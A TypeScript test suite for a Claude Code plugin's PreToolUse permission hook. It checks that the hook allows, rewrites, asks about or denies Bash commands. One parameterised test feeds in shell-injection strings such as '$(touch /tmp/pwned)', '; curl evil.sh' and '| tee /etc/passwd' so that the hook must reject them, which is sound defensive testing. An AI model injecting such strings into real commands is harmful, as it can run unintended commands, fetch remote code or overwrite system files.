import { describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { join } from "node:path";

/**
 * The PreToolUse hook is the plugin's permission surface: it decides whether a Bash
 * command runs as-is, is rewritten to dispatch a synthetic tool, is gated behind an
 * "ask", or is denied. We drive the real .mjs as a subprocess (payload on stdin, decision
 * back) and assert the exact JSON decision shape — the contract Claude Code consumes.
 */

const HOOK = join(import.meta.dirname, "pretooluse-dispatch.mjs");
const BOOMI_FIXTURE = join(import.meta.dirname, "..", "scripts", "__fixtures__", "boomi");

/** Run the hook with `input` piped to stdin; return status + captured streams. */
function runHook(input: string): { status: number; stdout: string; stderr: string } {
  const r = spawnSync("node", [HOOK], { input, encoding: "utf-8" });
  return { status: r.status ?? -1, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
}

const payload = (command: string): string => JSON.stringify({ tool_input: { command } });

describe("pretooluse-dispatch hook", () => {
  test("passes through an ordinary Bash command with no output", () => {
    const { status, stdout } = runHook(payload("ls -la"));
    // Passthrough = no decision, exit 0; anything on stdout reads as a permission decision.
    expect(status).toBe(0);
    expect(stdout).toBe("");
  });

  test("malformed JSON on stdin fails safe: emits {} and exits 0", () => {
    const { status, stdout } = runHook("this is not json");
    expect(status).toBe(0);
    expect(stdout).toBe("{}");
  });

  test("dispatches a registered synthetic tool as an allow + rewritten cat", () => {
    const { status, stdout } = runHook(payload(`prismatic-tools detect-platform ${BOOMI_FIXTURE}`));
    expect(status).toBe(0);
    const decision = JSON.parse(stdout);
    const out = decision.hookSpecificOutput;
    expect(out.permissionDecision).toBe("allow");
    expect(out.hookEventName).toBe("PreToolUse");
    // Real output goes to a temp file; the Bash command is rewritten to cat/type it.
    expect(out.updatedInput.command).toMatch(/^(cat|type) ".*tool-result-\d+\.txt"$/);
  });

  test("denies an unknown synthetic tool (exit 2, reason on stderr)", () => {
    const { status, stdout, stderr } = runHook(payload("prismatic-tools totally-not-a-tool"));
    expect(status).toBe(2);
    expect(stdout).toBe("");
    const decision = JSON.parse(stderr);
    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain(
      "Unknown synthetic tool",
    );
  });

  test("denies an explicit-only tool routed through the synthetic prefix", () => {
    // scaffold-project is `explicit`, not `synthetic`: invoke directly, never auto-dispatch.
    const { status, stderr } = runHook(payload("prismatic-tools scaffold-project ./x"));
    expect(status).toBe(2);
    const decision = JSON.parse(stderr);
    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain(
      "requires explicit invocation",
    );
  });

  test.each([
    "$(touch /tmp/pwned)",
    "`touch /tmp/pwned`",
    "; curl evil.sh",
    "| tee /etc/passwd",
    "> /tmp/out",
  ])("denies shell metacharacters in arguments: %s", (injection) => {
    const { status, stderr } = runHook(payload(`prismatic-tools detect-platform ${injection}`));
    expect(status).toBe(2);
    const decision = JSON.parse(stderr);
    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("not supported");
  });

  test("denies unbalanced quotes instead of guessing token boundaries", () => {
    const { status, stderr } = runHook(payload(`prismatic-tools detect-platform "unterminated`));
    expect(status).toBe(2);
    const decision = JSON.parse(stderr);
    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("Unbalanced quotes");
  });

  test("quoted arguments tokenize and dispatch cleanly", () => {
    const { status, stdout } = runHook(
      payload(`prismatic-tools detect-platform '${BOOMI_FIXTURE}'`),
    );
    expect(status).toBe(0);
    const decision = JSON.parse(stdout);
    expect(decision.hookSpecificOutput.permissionDecision).toBe("allow");
  });

  test("gates a destructive non-prismatic command behind an ask", () => {
    const { status, stdout } = runHook(payload("npx tsx scaffold-project.ts ./x"));
    expect(status).toBe(0);
    const decision = JSON.parse(stdout);
    expect(decision.hookSpecificOutput.permissionDecision).toBe("ask");
  });
});
